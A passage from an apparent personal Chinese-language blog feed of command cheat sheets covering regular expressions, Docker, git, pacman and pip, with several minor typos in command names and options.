<td align="left">如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td>
</tr>
<tr>
<td align="center"><strong>\u<em>n</em></strong></td>
<td align="left">匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。<br />例如，\u00A9匹配版权符号（©）。</td>
</tr>
</tbody></table>
<h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h2><table>
<thead>
<tr>
<th align="left">类型</th>
<th>regex</th>
</tr>
</thead>
<tbody><tr>
<td align="left">用户名</td>
<td>&#x2F;^[a-z0-9_-]{3,16}$&#x2F;</td>
</tr>
<tr>
<td align="left">密码</td>
<td>&#x2F;^[a-z0-9_-]{6,18}$&#x2F;</td>
</tr>
<tr>
<td align="left">十六进制值</td>
<td>&#x2F;^#?([a-f0-9]{6}|[a-f0-9]{3})$&#x2F;</td>
</tr>
<tr>
<td align="left">电子邮箱</td>
<td>&#x2F;^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$&#x2F; &#x2F;^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$&#x2F;</td>
</tr>
<tr>
<td align="left">URL</td>
<td>&#x2F;^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$&#x2F;</td>
</tr>
<tr>
<td align="left">IP 地址</td>
<td>&#x2F;((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)&#x2F; &#x2F;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&#x2F;</td>
</tr>
<tr>
<td align="left">HTML 标签</td>
<td>&#x2F;^&lt;([a-z]+)([^&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$&#x2F;</td>
</tr>
<tr>
<td align="left">删除代码\注释</td>
<td>(?&lt;!http:|\S)&#x2F;&#x2F;.*$</td>
</tr>
<tr>
<td align="left">Unicode编码中的汉字范围</td>
<td>&#x2F;^[\u2E80-\u9FFF]+$&#x2F;</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>regex</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 命令</title>
    <url>/docker/</url>
    <content><![CDATA[<h2 id="源配置"><a href="#源配置" class="headerlink" title="源配置"></a>源配置</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://registry.docker-cn.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version		<span class="comment"># 版本信息</span></span><br><span class="line">docker info		<span class="comment"># 系统信息</span></span><br><span class="line">docker &lt;order&gt; --<span class="built_in">help</span>	<span class="comment"># 帮助命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看容器最后10条日志</span></span><br><span class="line">docker logs -f -t --<span class="built_in">tail</span> 10 &lt;container&gt;</span><br></pre></td></tr></table></figure>



<h2 id="排错命令"><a href="#排错命令" class="headerlink" title="排错命令"></a>排错命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 容器 日志</span></span><br><span class="line">docker logs &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 容器 挂载端口映射等信息</span></span><br><span class="line">docker inspect &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 容器 端口映射</span></span><br><span class="line">docker port &lt;container&gt;</span><br></pre></td></tr></table></figure>



<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images			<span class="comment"># 查看镜像</span></span><br><span class="line">docker images -aq		<span class="comment"># 只显示镜像ID</span></span><br><span class="line">docker search &lt;image&gt;		<span class="comment"># 搜索镜像</span></span><br><span class="line">docker pull &lt;image&gt;		<span class="comment"># 下载镜像</span></span><br><span class="line">docker rmi -f &lt;image&gt;		<span class="comment"># 删除镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部镜像</span></span><br><span class="line">docker rmi -f $(docker images -aq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit 镜像</span></span><br><span class="line">docker commit  -m=<span class="string">&#x27;描述信息&#x27;</span> -a=<span class="string">&#x27;作者&#x27;</span> 容器<span class="built_in">id</span> 目标镜像名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 镜像重命名</span></span><br><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到Hub</span></span><br><span class="line">docker push new-repo:tagname</span><br></pre></td></tr></table></figure>



<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 运行容器</span></span><br><span class="line">docker run [param] &lt;image&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># run参数说明</span></span><br><span class="line">  --name=<span class="string">&quot;Name&quot;</span>		<span class="comment"># 容器名字 用来区分</span></span><br><span class="line">  -d	<span class="comment"># 后台方式运行</span></span><br><span class="line">  -it	<span class="comment"># 使用交互方式运行</span></span><br><span class="line">  -p	<span class="comment"># 指定容器端口 -p 8080:8080</span></span><br><span class="line">    -p	 <span class="comment"># ip:主机端口:容器端口</span></span><br><span class="line">    -p	 <span class="comment"># 主机端口:容器端口</span></span><br><span class="line">    -p	 <span class="comment"># 容器端口</span></span><br><span class="line">  -P	<span class="comment"># 大写P 随机端口</span></span><br><span class="line"></span><br><span class="line">dockee ps	<span class="comment"># 查看正在运行容器</span></span><br><span class="line">docker ps -a	<span class="comment"># 查看全部容器</span></span><br><span class="line">docker ps -a --no-trunc	<span class="comment"># 显示所以启动参数</span></span><br><span class="line">docker <span class="built_in">rm</span> &lt;containerID&gt; <span class="comment"># 删除容器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看容器详细信息</span></span><br><span class="line">docker inspect &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看容器占用空间</span></span><br><span class="line">docker system <span class="built_in">df</span> -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部容器</span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker images -aq)</span><br><span class="line"></span><br><span class="line">docker start &lt;container&gt;	<span class="comment"># 启动容器</span></span><br><span class="line">docker restart &lt;container&gt;	<span class="comment"># 重启容器</span></span><br><span class="line">docker stop &lt;container&gt;		<span class="comment"># 停止容器</span></span><br><span class="line">docker <span class="built_in">kill</span> &lt;container&gt;		<span class="comment"># 强制停止容器</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> &lt;container&gt;		<span class="comment"># 开启新的终端</span></span><br><span class="line">docker attach &lt;container&gt;	<span class="comment"># 进入当前运行终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式进入正在运行容器 </span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;container&gt; /bin/bash	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从容器内拷贝文件到主机</span></span><br><span class="line">docker <span class="built_in">cp</span> &lt;container&gt;:容器路径 主机路径</span><br><span class="line"><span class="comment"># 从主机内拷贝文件到容器</span></span><br><span class="line">docker <span class="built_in">cp</span> 主机路径 &lt;container&gt;:容器路径</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新容器配置</span></span><br><span class="line">docker update</span><br><span class="line"><span class="comment"># 设置容器自启动</span></span><br><span class="line">docker update –restart=always</span><br></pre></td></tr></table></figure>



<h2 id="退出命令"><a href="#退出命令" class="headerlink" title="退出命令"></a>退出命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止并退出</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 退出不停止（快捷键）</span></span><br><span class="line">Ctrl + P + Q</span><br></pre></td></tr></table></figure>

<h2 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 -v 挂载</span></span><br><span class="line">docker run -it -v &lt;主机目录&gt;:&lt;容器目录&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定路径挂载</span></span><br><span class="line">docker run -it -v /home/test:/home centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名挂载 -v 容器内路径</span></span><br><span class="line">docker run -d -P --name nginx01 -v /ect/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有 volume 的情况</span></span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v v-nginx:/etc/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 -v 容器路径 ro rw 改变读写权限</span></span><br><span class="line">  ro	<span class="built_in">readonly</span> 		<span class="comment"># 只读</span></span><br><span class="line">  rw	readwrite		<span class="comment"># 可读可写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只读权限设置</span></span><br><span class="line">dockers run -d -P --name nginx02 -v nginx:/etc/nginx:ro</span><br></pre></td></tr></table></figure>

<h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span>		<span class="comment"># 查看网络列表</span></span><br><span class="line">docker network inspect &lt;name&gt;	<span class="comment"># 查看网络详情</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --net 指定网卡(docker默认是bridge)</span></span><br><span class="line">docker run -d -P --net bridge tomcat</span><br><span class="line">	<span class="comment"># 自定义网络配置</span></span><br><span class="line">    --driver bridge		<span class="comment"># 网络模式</span></span><br><span class="line">    --subnet 192.168.0.0/16	<span class="comment"># 子网</span></span><br><span class="line">    --gateway 192.168.0.1	<span class="comment"># 网关</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟网卡</span></span><br><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 net</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器连接到网卡 打通容器与容器间网络</span></span><br><span class="line">docker network connect &lt;net&gt; &lt;ctn&gt;		<span class="comment"># 建立桥接</span></span><br><span class="line">docker network disconnect &lt;net&gt; &lt;ctn&gt;	<span class="comment"># 断开桥接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将容器连接到网络</span></span><br><span class="line">docker network connect &lt;net&gt; &lt;ctn&gt;</span><br></pre></td></tr></table></figure>



<h2 id="commit-镜像"><a href="#commit-镜像" class="headerlink" title="commit 镜像"></a>commit 镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令和git类似类似, 把自己修改的东西形成一个层 封装成一个镜像</span></span><br><span class="line">docker commit -m=<span class="string">&#x27;描述信息&#x27;</span> -a=<span class="string">&#x27;作者&#x27;</span> 容器<span class="built_in">id</span> 目标镜像名</span><br></pre></td></tr></table></figure>



<h2 id="迁移操作"><a href="#迁移操作" class="headerlink" title="迁移操作"></a>迁移操作</h2><p><strong>镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 压缩镜像</span></span><br><span class="line">docker save -o image-name.tar image-name </span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载镜像</span></span><br><span class="line">docker load image-name.tar</span><br></pre></td></tr></table></figure>

<p><strong>容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出容器到tar文件</span></span><br><span class="line">docker <span class="built_in">export</span> container-name container-name.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载容器文件创建镜像文件</span></span><br><span class="line">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure>



<h2 id="DockerFile-命令"><a href="#DockerFile-命令" class="headerlink" title="DockerFile 命令"></a>DockerFile 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成镜像</span></span><br><span class="line">docker build -f dockerfile文件 -t 镜像名:[tag] .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看初始化运行记录</span></span><br><span class="line">docker <span class="built_in">history</span> 镜像<span class="built_in">id</span></span><br></pre></td></tr></table></figure>



<h2 id="DockerFile-指令"><a href="#DockerFile-指令" class="headerlink" title="DockerFile 指令"></a>DockerFile 指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM		<span class="comment"># 基础镜像 一切从这里开始构建</span></span><br><span class="line">MAINTAINER	<span class="comment"># 镜像是谁写的 name+mail</span></span><br><span class="line">RUN		<span class="comment"># 镜像构建时候运行的命令</span></span><br><span class="line">ADD		<span class="comment"># 添加文件 url或路径</span></span><br><span class="line">WORKDIT		<span class="comment"># 镜像工作目录</span></span><br><span class="line">VOLUME		<span class="comment"># 挂载的目录</span></span><br><span class="line">EXPOST		<span class="comment"># 保留端口配置</span></span><br><span class="line">CMD		<span class="comment"># 指定这个容器启动时候运行的命令, 只有最后一个会生效, 可被替代</span></span><br><span class="line">ENTRTPOINT	<span class="comment"># 指定这个容器启动时候要运行的命令, 可以追加命令</span></span><br><span class="line">ONBUILD		<span class="comment"># 被继承 DockerFile 时候运行, 触发命令</span></span><br><span class="line">COPY		<span class="comment"># 类似ADD, 将文件拷贝到镜像</span></span><br><span class="line">ENV		<span class="comment"># 构建时候设置环境变量</span></span><br></pre></td></tr></table></figure>



<h2 id="docker-compose-命令"><a href="#docker-compose-命令" class="headerlink" title="docker-compose 命令"></a>docker-compose 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up                  <span class="comment"># 启动所有容器</span></span><br><span class="line">docker-compose up -d               <span class="comment"># 后台启动并运行所有容器</span></span><br><span class="line">docker-compose up --no-recreate -d <span class="comment"># 不重新创建已经停止的容器</span></span><br><span class="line">docker-compose up -d test2         <span class="comment"># 只启动test2这个容器</span></span><br><span class="line">docker-compose stop                <span class="comment"># 停止容器</span></span><br><span class="line">docker-compose start               <span class="comment"># 启动容器</span></span><br><span class="line">docker-compose down                <span class="comment"># 停止并销毁容器</span></span><br></pre></td></tr></table></figure>



<h2 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h2><p>db容器无法连接解决方法<br>错误信息: <code>Access denied for user &#39;root&#39;@&#39;172.18.0.5&#39; (using password: YES)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down --volumes</span><br><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>git 命令文档</title>
    <url>/git/</url>
    <content><![CDATA[<h2 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config user.name &lt;name&gt;</span><br><span class="line">git config user.email &lt;email&gt;</span><br><span class="line">git config --global user.name &lt;name&gt;	<span class="comment"># 配置全局用户名</span></span><br><span class="line">git config --global user.email &lt;email&gt;	<span class="comment"># 配置全局邮箱</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 颜色标识（默认开启）</span></span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line">git config --global color.status auto</span><br><span class="line">git config --global color.diff auto</span><br><span class="line">git config --global color.branch auto</span><br><span class="line">git config --global color.interactive auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy &lt;proxy&gt;</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy &lt;proxy&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看配置</span></span><br><span class="line">git config list</span><br></pre></td></tr></table></figure>



<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化仓库</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;url&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到index</span></span><br><span class="line">git add &lt;pathspec&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除index中的文件</span></span><br><span class="line">git <span class="built_in">rm</span> &lt;pathspec&gt;</span><br><span class="line"><span class="comment"># 删除未提交缓存</span></span><br><span class="line">git <span class="built_in">rm</span> --cached &lt;pathspec&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看仓库状态</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"><span class="comment"># 查看分支合并</span></span><br><span class="line">git <span class="built_in">log</span> --graph</span><br><span class="line"><span class="comment"># 精简查看</span></span><br><span class="line">git <span class="built_in">log</span> --graph --pretty=oneline --abbrev-commit</span><br><span class="line"></span><br><span class="line">git commit -m &lt;message&gt;			<span class="comment"># 提交文件, 附带版本说明</span></span><br><span class="line">git commit --amend -m &lt;message&gt;		<span class="comment"># 合并上一次提交（用于反复修改）</span></span><br><span class="line">git commit -am &lt;message&gt;		<span class="comment"># 将add和commit合为一步</span></span><br><span class="line"></span><br><span class="line">git remote -v				<span class="comment"># 查看远程仓库地址</span></span><br><span class="line">git remote add origin &lt;url&gt;		<span class="comment"># 添加origin分支</span></span><br><span class="line">git remote <span class="built_in">rm</span> origin			<span class="comment"># 删除origin分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新设置远程仓库地址</span></span><br><span class="line">git remote set-url origin &lt;git.url&gt;</span><br><span class="line"></span><br><span class="line">git pull	<span class="comment"># 拉 简写形式</span></span><br><span class="line">git pull origin master			<span class="comment"># 同步远程仓库更新到master分支</span></span><br><span class="line"></span><br><span class="line">git push	<span class="comment"># 推 简写形式</span></span><br><span class="line">git push -u origin master		<span class="comment"># 推送本地仓库到origin分支</span></span><br><span class="line"></span><br><span class="line">git push -f <span class="comment"># 强制推送分支, 会覆盖修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置当前分支的关联的远程分支</span></span><br><span class="line">git branch --set-upstream-to=origin/master master</span><br></pre></td></tr></table></figure>



<h2 id="进阶命令"><a href="#进阶命令" class="headerlink" title="进阶命令"></a>进阶命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 difference（差异）</span></span><br><span class="line">git diff		<span class="comment"># 工作区与暂存区</span></span><br><span class="line">git diff --cached 	<span class="comment"># 暂存区与版本库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回滚到上一版本 HEAD~100 前100个版本 可指定&lt;版本号&gt;</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line">git reset &lt;版本号&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有版本 包括回退过的</span></span><br><span class="line">git reflog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看分支</span></span><br><span class="line">git branch</span><br><span class="line">git branch &lt;branch&gt; 	<span class="comment"># 创建分支</span></span><br><span class="line">git branch -d &lt;branch&gt;	<span class="comment"># 删除分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复（删除）工作区更改</span></span><br><span class="line">git checkout</span><br><span class="line">git checkout &lt;branch&gt; 	<span class="comment"># 切换分支</span></span><br><span class="line">git checkout -b &lt;branch&gt;<span class="comment"># 创建并切换分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并分支</span></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有远程分支（不更新本地分支，另需merge）</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment"># 获取所有原创分支并清除服务器上已删掉的分支</span></span><br><span class="line">git fetch --prune</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并分支但不丢弃分支信息</span></span><br><span class="line">git merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建临时分支</span></span><br><span class="line">git stash</span><br><span class="line">git stash list	<span class="comment"># 查看临时分支</span></span><br><span class="line">git stash drop	<span class="comment"># 删除stash</span></span><br><span class="line">git stash apply	<span class="comment"># 恢复分支内容</span></span><br><span class="line">git stash pop	<span class="comment"># 恢复分支内容并删除stash</span></span><br><span class="line">git stash apply stash@&#123;0&#125;<span class="comment"># 恢复指定的stash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制一个特定的提交到当前分支</span></span><br><span class="line">git cherry-pick &lt;版本号&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换分支</span></span><br><span class="line">git checkout 1acd5de</span><br><span class="line"><span class="comment"># 保存修改后分支</span></span><br><span class="line">it switch -c &lt;新分支名&gt;</span><br><span class="line"><span class="comment"># 恢复切换前分支</span></span><br><span class="line">git switch -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地仓库强制替换远程仓库</span></span><br><span class="line">git push --force --set-upstream origin &lt;branch&gt;</span><br></pre></td></tr></table></figure>



<h3 id="替换分支"><a href="#替换分支" class="headerlink" title="替换分支"></a>替换分支</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将master替换成mainf</span></span><br><span class="line">git checkout main</span><br><span class="line">git merge -s ours master	<span class="comment"># git --strategy=ours ours master</span></span><br><span class="line">git checkout master</span><br><span class="line">git merge main</span><br></pre></td></tr></table></figure>



<h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看子模块</span></span><br><span class="line">git submodule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">git submodule init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加子模块</span></span><br><span class="line">git submodule add &lt;项目地址&gt; &lt;路径&gt;</span><br><span class="line"><span class="comment"># 添加指定分支</span></span><br><span class="line">git submodule add -b v1.0 &lt;项目地址&gt; &lt;路径&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新(克隆)子模块</span></span><br><span class="line">git submodule update --init --remote --recursive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除子模块</span></span><br><span class="line">git <span class="built_in">rm</span> -rf --cached &lt;路径&gt;</span><br></pre></td></tr></table></figure>



<h2 id="zsh-快捷命令"><a href="#zsh-快捷命令" class="headerlink" title="zsh 快捷命令"></a>zsh 快捷命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gapa    	git add --patch</span><br><span class="line">gc!   		git commit -v --amend</span><br><span class="line">gcl  		git <span class="built_in">clone</span> --recursive</span><br><span class="line">gclean    	git reset --hard &amp;&amp; git clean -dfx</span><br><span class="line">gcm    		git checkout master</span><br><span class="line">gcmsg    	git commit -m</span><br><span class="line">gco    		git checkout</span><br><span class="line">gd    		git diff</span><br><span class="line">gdca    	git diff --cached</span><br><span class="line">gp    		git push</span><br><span class="line">grbc    	git rebase --<span class="built_in">continue</span></span><br><span class="line">gst    		git status</span><br><span class="line">gup    		git pull --rebase</span><br></pre></td></tr></table></figure>



<h2 id="分支命名规范"><a href="#分支命名规范" class="headerlink" title="分支命名规范"></a>分支命名规范</h2><table>
<thead>
<tr>
<th>分支</th>
<th>命名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>主分支</td>
<td>master</td>
<td>主分支，所有提供给用户使用的正式版本，都在这个主分支上发布</td>
</tr>
<tr>
<td>开发主分支</td>
<td>dev</td>
<td>开发分支，永远是功能最新最全的分支</td>
</tr>
<tr>
<td>功能分支</td>
<td>feature-*</td>
<td>新功能分支，某个功能点正在开发阶段</td>
</tr>
<tr>
<td>发布版本</td>
<td>release-*</td>
<td>发布定期要上线的功能</td>
</tr>
<tr>
<td>修复发布版本分支</td>
<td>bugfix-release-*</td>
<td>修复测试bug</td>
</tr>
<tr>
<td>紧急修复分支</td>
<td>bugfix-master-*</td>
<td>紧急修复线上代码的 bug</td>
</tr>
</tbody></table>
<h2 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h2><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p><img data-src="http://img.owq.world/2022/05/1202-904caf.png"></p>
<h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><p><img data-src="http://img.owq.world/2022/05/1202-f68d47.png"></p>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>pacman 命令</title>
    <url>/pacman/</url>
    <content><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级整个系统，-y 更新数据库, -yy 强制更新, -u是升级软件</span></span><br><span class="line">pacman -Syu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除软件缓存，即/var/cache/pacman/pkg目录下的文件</span></span><br><span class="line">pacman -Sc</span><br></pre></td></tr></table></figure>

<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在包数据库中查询软件</span></span><br><span class="line">pacman -Ss &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示软件的详细信息</span></span><br><span class="line">pacman -Si &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询已安装的软件包</span></span><br><span class="line">pacman -Qs &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询本地安装包的详细信息</span></span><br><span class="line">pacman -Qi &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取已安装软件所包含的文件的列表</span></span><br><span class="line">pacman -Ql &lt;package&gt;	</span><br></pre></td></tr></table></figure>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装软件</span></span><br><span class="line">pacman -S &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装不同仓库中的版本</span></span><br><span class="line">pacman -S &lt;extra&gt;/&lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从本地文件安装</span></span><br><span class="line">pacman -U package.tar.zx</span><br></pre></td></tr></table></figure>



<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除单个软件</span></span><br><span class="line">pacman -R &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定软件及其没有被其他已安装软件使用的依赖关系</span></span><br><span class="line">pacman -Rs &lt;package&gt; </span><br></pre></td></tr></table></figure>



<h2 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a>其它命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示软件的依赖树</span></span><br><span class="line">pactree &lt;package&gt;  </span><br></pre></td></tr></table></figure>



<h2 id="吃豆人彩蛋"><a href="#吃豆人彩蛋" class="headerlink" title="吃豆人彩蛋"></a>吃豆人彩蛋</h2><p>编辑配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>pacman.conf</span><br></pre></td></tr></table></figure>

<p>取消 <code>#Color</code> 一行的注释, 在下面添加 <code>ILoveCandy</code></p>
<img data-src="http://img.owq.world/2022/09/1046-12bc31.png" alt="" style="zoom:50%;" />

<p>效果展示</p>
<p><img data-src="http://img.owq.world/2022/09/1037-bc566b.png"></p>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pip 命令</title>
    <url>/pip/</url>
    <content><![CDATA[<h2 id="Linux-安装"><a href="#Linux-安装" class="headerlink" title="Linux 安装"></a>Linux 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install python3-pip</span><br></pre></td></tr></table></figure>



